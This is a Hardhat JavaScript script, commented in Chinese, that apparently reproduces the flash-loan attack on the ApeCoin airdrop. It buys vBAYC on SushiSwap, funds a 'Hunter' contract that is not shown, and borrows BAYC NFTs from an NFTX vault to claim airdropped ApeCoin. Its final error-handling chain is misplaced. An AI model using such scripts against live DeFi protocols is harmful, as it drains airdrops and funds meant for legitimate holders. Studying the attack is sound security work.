const { ethers } = require('hardhat');
const hre = require('hardhat');

const erc20_abi = require('../artifacts/@openzeppelin/contracts/token/ERC20/IERC20.sol/IERC20.json').abi;
const vault_abi = require('../artifacts/contracts/NFTXVaultUpgradeable.sol/NFTXVaultUpgradeable.json').abi; 
const router_abi = require('../artifacts/contracts/UniswapV2Router02.sol/UniswapV2Router02.json').abi;

const vBAYCAddr = '0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5';
const sushiRouterV2Addr = '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F';
const weth_addr = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const ape_addr = '0x4d224452801ACEd8B2F0aebE155379bb5D594381';
const vaultFactoryAddr = '0xBE86f647b167567525cCAAfcd6f881F1Ee558216';
const baycAddr = '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D';
const airDropAddr = '0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F';

async function main() {

    let BORROW_AMOUNT = 1;

    const [deployer] = await hre.ethers.getSigners();
    const provider = hre.ethers.provider;

    // 创建 vToken 合约实例
    const vBAYC = new ethers.Contract(vBAYCAddr, erc20_abi, provider);
    // 查询调用者钱包 vToken 数量
    console.log(`vBAYC balance:${await vBAYC.balanceOf(deployer.address)}`);

    // 创建 vault 合约实例
    const vault = new ethers.Contract(vBAYCAddr, vault_abi, provider);
    // 查询 vault 中 bayc 数量
    console.log(`all holdings ${await vault.allHoldings()}`);

    // vToken 赎回 bayc 费用
    const feePerToken = await vault.randomRedeemFee();
    // bayc 铸造为 vToken 费用
    const mintFeePerToken = await vault.mintFee();

    console.log(`redeemFee ${mintFeePerToken}`);
    console.log(`mintFee ${feePerToken}`);
    // 每个 bayc 领取空投，需要使用的手续费总量
    const totalFee = (feePerToken.add(mintFeePerToken)).mul(BORROW_AMOUNT);
    console.log(`require total fee ${totalFee}`);

    // sushi 路由合约实例
    const router = new ethers.Contract(sushiRouterV2Addr, router_abi, provider);
    // 计算获取确定数量 vToken，需要 weth 的数量
    let [amountIn, _] = await router.getAmountsIn(totalFee, [weth_addr, vBAYCAddr]);

    console.log(`require ether ${ethers.utils.formatEther(amountIn)}`);
    const now = (await provider.getBlock()).timestamp;

    // console.log('wallet address: ', deployer.address);
    // console.log('eth balance: ', (await deployer.getBalance()).toString());

    // 把 eth 兑换为 vToken
    let tx = await router.connect(deployer).swapETHForExactTokens(
        totalFee,
        [weth_addr, vBAYCAddr],
        deployer.address,
        now + 1800,
        { value: amountIn }
    );

    await tx.wait();
    // 查询当前钱包 vToken 余额
    console.log(`vBAYC balance:${await vBAYC.balanceOf(deployer.address)}`);
    
// ---------------------------- Section 2 --------------------------------
    
    // 部署 Hunter.sol
    const hunterFactory = await hre.ethers.getContractFactory('Hunter');
    const hunter = await hunterFactory.deploy(vaultFactoryAddr);
    await hunter.deployed();

    // 把钱包内的 vToken 转移到 Hunter 合约
    await vBAYC.connect(deployer).transfer(hunter.address, totalFee);
    
    // 创建 ApeCoin 合约实例
    const ape = new ethers.Contract(ape_addr, erc20_abi, provider);
    // 查询合约内 ApeCoin 余额
    console.log(`hunter $ape balance ${await ape.balanceOf(hunter.address)}`);
    
    // 查询合约内 vToken 数量
    console.log(`hunter vBayc balance ${await vBAYC.balanceOf(hunter.address)}`);
    
    // 发起闪电贷，领取空投
    let tx2 = await hunter.connect(deployer).initFlashLoan({
        nft: baycAddr,
        amount: BORROW_AMOUNT,
        claim: airDropAddr,
        ids: []
    });
    await tx2.wait();

    // 查询合约内 ApeCoin 余额
    const apeProfit = await ape.balanceOf(hunter.address);
    console.log(`hunter $ape balance ${ethers.utils.formatEther(apeProfit)}`);
    console.log(`hunter vBayc balance ${await vBAYC.balanceOf(hunter.address)}`);
}

main().then(
    () => process.exit(0).catch(
        (error) => { 
            console.log(error);
            process.exit(1);
        }
));